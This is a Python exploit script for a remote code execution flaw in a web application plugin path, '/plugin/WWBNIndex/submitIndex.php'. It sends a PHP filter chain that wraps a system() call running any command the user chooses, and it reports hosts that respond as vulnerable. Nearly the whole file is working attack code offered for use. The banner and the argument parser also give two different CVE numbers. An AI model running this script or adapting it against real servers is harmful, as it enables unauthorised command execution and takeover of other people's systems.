#!/bin/env python3


import requests
from php_filter_chain import PHPFilterChainGenerator
from colorama import Fore, Style
import argparse
import threading
import sys
import art

def color():
     text = art.text2art("CVE-2024-3189", font="blg")
     print(Fore.GREEN + Style.BRIGHT +text+'\nCoded by Jhonson\n'+ Style.RESET_ALL)

color()


def main(target,payload,header,path):

 try:
    generator=PHPFilterChainGenerator()
    space='                                                    '
    function=generator.generate_filter_chain(code)
    response = requests.post(f'{target}{path}',data={"systemRootPath":function},headers=header,verify=False,timeout=20)
    if response.status_code == 200:
       r = response.text
       line = r.split('\n', 1)[0]
       print(Fore.GREEN + Style.BRIGHT +f'[+]{target} Vulnerable\n\n{line}' + Style.RESET_ALL)
     
           

    else :

       print(Fore.RED + Style.BRIGHT +f'[-]{target} No vulnerable'+ Style.RESET_ALL) 
  
 except requests.exceptions.ConnectionError:
            print(Fore.RED + Style.BRIGHT +f'[-] DNS problem or data connexion' + Style.RESET_ALL) 
             
            
 except requests.exceptions.MissingSchema:
       print('')


if __name__=='__main__':

         
         headers = {"Content-Type": "application/x-www-form-urlencoded"}

         
         parser = argparse.ArgumentParser(description="CVE-2024-31819")
         parser.add_argument("-url", "--url", dest="url", help="Single url", required=False)     
         parser.add_argument("-cmd", "--cmd", dest="cmd", help="command execution", required=False) 
         args = parser.parse_args()

         cmd=args.cmd
         code = f"<?php echo '[S]';system('{cmd}');echo '[E]';?>"
         


         main(args.url,code,headers,'/plugin/WWBNIndex/submitIndex.php') 


